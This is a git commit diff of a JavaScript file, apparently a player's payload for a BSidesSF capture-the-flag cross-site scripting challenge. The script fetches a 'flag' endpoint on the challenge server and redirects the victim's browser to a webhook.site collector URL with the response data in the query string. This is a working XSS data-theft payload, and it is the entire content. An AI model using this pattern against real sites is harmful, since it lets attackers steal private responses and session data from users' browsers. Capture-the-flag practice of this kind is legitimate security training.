e6805dfbfc089d45e6c25239e68fbed709acae43
Rohit Prasanth <51421167+h3ri0s@users.noreply.github.com>
2024-05-04 15:02:21 +0530

    Update woof.js

--- woof.js
+++ woof.js
@@ -1,6 +1,6 @@
+console.log("asd")
 fetch("https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag",{ mode: 'no-cors'})
     .then(response => response.text())
     .then(data => {
-        console.log(data)
       window.location.href = `https://webhook.site/ca29ad34-6c1d-49f7-ac5e-8d231cf04e74?responseFromXSS=${encodeURIComponent(data)}`;
     });
